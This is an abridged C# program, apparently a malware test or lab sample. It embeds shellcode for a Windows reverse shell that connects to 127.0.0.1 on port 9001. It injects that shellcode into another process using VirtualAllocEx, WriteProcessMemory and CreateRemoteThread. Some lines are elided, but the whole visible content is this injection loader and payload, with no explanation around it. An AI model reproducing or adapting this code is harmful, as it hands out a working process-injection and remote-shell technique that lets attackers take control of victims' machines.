...
namespace testAPI
{
    internal class Program
    {
        ...
        static byte[] shellcode = new byte[324] {0xfc,0xe8,0x82,0x00,0x00,0x00,
...
0x97,0x6a,0x05,0x68,0x7f,0x00,0x00,0x01,0x68,0x02,0x00,0x23,
0x29,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
...
0x6f,0x6a,0x00,0x53,0xff,0xd5};
        ...
        static void Main(string[] args)
        {
            ...
            IntPtr b_shellcode = VirtualAllocEx(h_process, IntPtr.Zero, (uint)shellcode.Length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(h_process, b_shellcode, shellcode, (uint)shellcode.Length, out bytesWritten);
            IntPtr h_thread = CreateRemoteThread(h_process, IntPtr.Zero, 0, b_shellcode, IntPtr.Zero, 0, IntPtr.Zero);
